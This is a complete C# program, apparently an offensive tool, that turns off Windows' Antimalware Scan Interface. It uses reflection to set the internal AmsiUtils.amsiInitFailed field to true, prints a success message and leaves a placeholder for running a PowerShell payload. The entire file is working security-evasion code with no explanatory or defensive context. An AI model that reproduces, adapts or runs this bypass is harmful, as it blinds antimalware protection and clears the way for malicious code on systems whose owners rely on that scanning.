using System;
using System.Reflection;

namespace AmsiBypass
{
    class Program
    {
        static void Main()
        {
            try
            {
                // Get internal AmsiUtils class
                var amsiUtilsType = Type.GetType("System.Management.Automation.AmsiUtils, System.Management.Automation");

                if (amsiUtilsType != null)
                {
                    // Locate the internal static field amsiInitFailed
                    var field = amsiUtilsType.GetField("amsiInitFailed", BindingFlags.NonPublic | BindingFlags.Static);
                    
                    // Set the field value to true, forcing AMSI to consider initialization failed
                    if (field != null)
                    {
                        field.SetValue(null, true);
                        Console.WriteLine("[+] AMSI bypassed successfully using reflection!");
                    }
                    else
                    {
                        Console.WriteLine("[-] Field not found");
                    }
                }
                else
                {
                    Console.WriteLine("[-] AmsiUtils type not found");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Exception: {ex.Message}");
            }
            Console.WriteLine(">>> Execute your PowerShell payload here...");
        }
    }
}